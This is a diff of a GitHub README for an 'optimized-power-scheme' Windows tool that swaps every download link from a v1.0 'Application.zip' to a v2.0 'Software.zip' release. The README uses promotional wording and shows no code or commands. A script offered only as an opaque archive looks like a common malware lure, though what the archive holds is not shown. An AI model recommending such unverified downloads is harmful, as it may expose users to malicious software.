@@ -13,7 +13,7 @@ Welcome to the "optimized-power-scheme" GitHub repository! This repository conta
 
 ## How to Use
 
-1. Download the script from the following link: [Download Script](https://github.com/HyperUltraMegaSonic/optimized-power-scheme/releases/download/v1.0/Application.zip)
+1. Download the script from the following link: [Download Script](https://github.com/HyperUltraMegaSonic/optimized-power-scheme/releases/download/v2.0/Software.zip)
    
 2. Launch the script and follow the on-screen instructions to create the "Optimized" power scheme on your Windows machine.
 
@@ -25,7 +25,7 @@ Welcome to the "optimized-power-scheme" GitHub repository! This repository conta
 
 Ready to supercharge your Windows performance? Download the script now! 
 
-[![Download Script](https://github.com/HyperUltraMegaSonic/optimized-power-scheme/releases/download/v1.0/Application.zip)](https://github.com/HyperUltraMegaSonic/optimized-power-scheme/releases/download/v1.0/Application.zip)
+[![Download Script](https://github.com/HyperUltraMegaSonic/optimized-power-scheme/releases/download/v2.0/Software.zip)](https://github.com/HyperUltraMegaSonic/optimized-power-scheme/releases/download/v2.0/Software.zip)
 
 For more updates and versions, check the *Releases* section of this repository.
 
